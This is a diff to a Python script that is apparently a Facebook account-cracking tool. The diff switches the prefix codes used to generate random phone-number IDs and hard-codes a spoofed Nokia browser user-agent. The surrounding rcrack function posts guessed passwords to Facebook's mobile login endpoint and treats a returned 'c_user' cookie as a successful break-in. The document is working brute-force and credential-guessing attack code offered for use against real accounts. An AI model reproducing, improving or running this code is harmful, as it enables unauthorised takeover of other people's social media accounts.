@@ -202,12 +202,12 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m018,\033[38;5;195m018{x}')
+    print(f' \033[38;5;196m[\033[38;5;195m•\033[38;5;196m]\033[38;5;46m Example>: \033[38;5;45m019,\033[38;5;46m019,\033[38;5;195m019{x}')
     print(" \033[93;1m●\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═━═\033[93;1m❴\033[47m\033[1;30msiam VAI\033[40m\033[00m\033[93;1m❵\x1b[1;92m═━═━═━═━═━═━═━═━═━═━═\033[93;1m●\n")
-    rk1 = '0181'
-    rk2 = '0182'
-    rk3 = '0184'
-    rk4 = '018'
+    rk1 = '0191'
+    rk2 = '0192'
+    rk3 = '0194'
+    rk4 = '019'
     code = random.choice([rk1,rk2,rk3])                       #input(f' [{xr}â– {x}] Choose : ')
     os.system('clear')
     print(logo)
@@ -227,7 +227,7 @@ def xxr():
         clear()
         tl = str(len(user))
         print('\033[93;1m●\x1b[1;92m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[47m\x1b[1;92m𝐆𝐒𝐓\033[40m\033[00m\033[93;1m▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃▃\033[93;1m●')
-        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐂𝐎𝐎𝐃𝐄 : 018')
+        jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐂𝐇𝐎𝐎𝐒𝐄 𝐘𝐎𝐔𝐑 𝐂𝐎𝐎𝐃𝐄 : 019')
         jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐘𝐎𝐔𝐑 𝐓𝐎𝐓𝐀𝐋 𝐈𝐃𝐒 : \033[38;5;46m'+tl)
         jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐔𝐬𝐞𝐫 𝐚𝐠𝐞𝐧𝐭 : 2000')
         jalan(f' \033[38;5;196m[\033[38;5;195m✔️\033[38;5;196m]\x1b[1;92m𝐦𝐨𝐛𝐢𝐥𝐞 𝐝𝐚𝐭𝐚 + 𝐰𝐢𝐟𝐢 𝐨𝐧')
@@ -285,7 +285,7 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': 'Mozilla/5.0 (Symbian/3; Series60/3.8 Nokia9121/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/2.1.1.2 Mobile Safari/535.1', 'accept-encoding': 'gzip, deflate br', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Connection': 'keep-alive', 'Host': 'm.facebook.com', 'upgrade-insecure-requests': '1', 'dnt': '1', 'x-requested-with': 'mark.via.gp', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'cors', 'sec-fetch-user': 'empty', 'sec-fetch-dest': 'document', 'referer': 'https://m.facebook.com/', 'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8'}
             lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
